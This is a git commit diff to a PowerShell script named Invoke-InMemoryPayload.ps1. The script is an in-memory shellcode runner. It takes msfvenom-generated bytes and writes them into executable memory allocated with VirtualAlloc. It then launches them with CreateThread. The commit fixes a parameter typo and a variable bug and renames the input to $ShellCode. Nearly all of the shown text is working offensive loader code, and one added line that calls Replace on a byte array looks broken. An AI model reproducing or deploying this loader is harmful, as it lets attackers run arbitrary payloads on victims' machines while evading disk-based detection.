c15921df725e8823d2ac03f622db2d1107ecbb25
tobor <rosborne@osbornepro.com>
2020-04-02 18:10:29 -0600

    Update Invoke-InMemoryPayload.ps1

--- Invoke-InMemoryPayload.ps1
+++ Invoke-InMemoryPayload.ps1
@@ -4,13 +4,14 @@ Function Invoke-InMemoryPayload
         param(
             [Parameter(
                 Mandatory=$True,
-                Poisition=0,
+                Position=0,
                 ValueFromPipeline=$True, 
                 ValueFromPipelineByPropertyName=$True,
                 HelpMessage='Generate an msfvenom payload. Copy the value of the byte variable and place it here.')]  # End Parameter
-            [Byte[]]$Payload
+            [Byte[]]$ShellCode
         )  # End param
 
+    Write-Verbose "Importing DLL's..."
     $CSCode = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -19,15 +20,16 @@ public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStack
 [DllImport("msvcrt.dll")]
 public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
-    Write-Verbose "Importing DLL's..."
     $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
     $Size = 0x1000
+    [Byte[]];
+    [Byte[]]$ShellCode = $ShellCode.Replace('"','')
 
-    If ($Payload.Length -gt 0x1000) 
+    If ($ShellCode.Length -gt 0x1000) 
     {
 
-        $Size = $Payload.Length
-        
+        $Size = $ShellCode.Length
+
         Write-Verbose "Length of payload is $Size"
 
     }  # End If
@@ -36,20 +38,20 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)
 
     Write-Verbose "Writing payload to newly allocated memory block using memset()..."
-    For ( $i = 0 ; $i -le ($Payload.Length - 1); $i++ ) 
+    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) 
     {
         
-        $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)
+        $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
 
     }  # End For
 
     Write-Verbose "Executing in separte thread using CreateThread()..."
     $WinFunc::CreateThread(0,0,$X,0,0,0)
-    for (;;) 
-    { 
+    For (;;)
+    {
         
-        Start-sleep 60 
-
+        Start-sleep -Seconds 60
+    
     }  # End For
 
 }  # End Invoke-InMemoryPayload
